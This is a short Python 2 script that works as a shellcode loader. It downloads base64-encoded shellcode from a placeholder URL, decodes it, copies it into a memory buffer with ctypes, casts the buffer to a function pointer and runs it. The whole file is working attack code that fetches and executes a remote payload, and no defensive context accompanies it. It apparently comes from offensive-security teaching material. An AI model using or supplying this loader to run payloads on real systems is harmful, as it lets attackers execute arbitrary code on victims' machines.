import urllib2
import ctypes
import base64

# retreive shellcode
url = "http://localhost/your.shellcode.address"
response = urllib2.urlopen(url)

# decode the shellcode
shellcode = base64.b64decode(response.read())

# create buffer in memory
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# create fp of shellcode
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# execute shellcode
shellcode_func()